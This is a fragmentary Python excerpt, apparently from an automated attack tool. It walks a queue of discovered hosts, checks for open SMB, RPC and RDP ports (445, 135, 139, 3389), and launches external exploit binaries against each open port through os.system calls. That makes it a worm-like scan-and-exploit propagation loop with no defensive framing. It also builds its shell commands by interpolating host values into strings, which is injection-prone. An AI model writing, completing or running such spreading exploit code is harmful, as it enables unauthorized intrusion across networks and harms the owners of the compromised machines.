...
def run_smb_exploit(server_ip, server_port="445"):
    cmd = f"./smb_exploit {server_ip} {server_port}"
    os.system(cmd)

def run_red_team_exploit(host, port):
    cmd = f"./exploit_tool {host} {port}"
    print(f"Attempting red team exploit on {host}:{port} using {cmd}")
    os.system(cmd)
    ...
    while q:
        ...
        if host_ip:
            if is_port_445_open(host_ip):
                ...
                run_background_thread(host_ip)
            for port in [135, 139, 3389]:
                if is_port_open(host_ip, port):
                    print(f"Port {port} is open on {host_ip}")
                    run_red_team_exploit(host_ip, port)
                else:
                    print(f"Port {port} not open on {host_ip}")
        if u in visited:
            continue
        if d > max_depth:
            break
